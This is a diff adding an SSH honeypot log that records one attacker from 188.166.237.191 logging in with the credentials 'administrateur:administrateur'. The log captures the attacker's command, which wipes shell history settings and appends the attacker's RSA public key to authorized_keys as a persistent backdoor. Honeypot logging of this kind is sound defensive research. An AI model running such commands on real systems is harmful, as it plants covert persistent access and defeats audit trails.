@@ -1,0 +1,16 @@
+2019-11-14 23:08:23.668 - [Info] MITM Version: 1.26
+2019-11-14 23:08:23.676 - [Info] Auto Access Enabled: true
+2019-11-14 23:08:23.676 - [Debug] [Init] Auto Access Barrier: true
+2019-11-14 23:08:23.727 - [Info] SSH man-in-the-middle server for 172.20.0.4 listening on 0.0.0.0:10103
+2019-11-14 23:13:50.423 - [Debug] [Connection] Attacker connected: 188.166.237.191 | Client Identification: SSH-2.0-libssh2_1.2.8
+2019-11-14 23:13:52.577 - [Debug] [Auth] Attacker 188.166.237.191 trying to authenticate with "password"
+2019-11-14 23:13:52.580 - [Debug] [Auto Access] Attacker: 188.166.237.191, Threshold: 1, Attempts: 1
+2019-11-14 23:13:52.580 - [Debug] [Auto Access] Compromising the honeypot
+2019-11-14 23:13:52.580 - [Debug] [Auto Access] Adding the following credentials: "administrateur:administrateur"
+2019-11-14 23:13:53.062 - [Debug] [Auth] Valid credentials - Password Authentication
+2019-11-14 23:13:53.062 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.4
+2019-11-14 23:14:08.382 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2019-11-14 23:14:09.445 - [Debug] [EXEC] Noninteractive mode attacker command: uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd;mkdir .ssh;cat .ssh/authorized_keys|grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k;mv .ssh/.auth_k .ssh/authorized_keys;cd
+2019-11-14 23:14:10.372 - [Debug] [Connection] Attacker closed connection
+2019-11-14 23:14:10.390 - [Debug] [LXC] Container's OpenSSH server ended connection
+2019-11-14 23:14:10.392 - [Debug] [LXC] Container's OpenSSH server closed connection
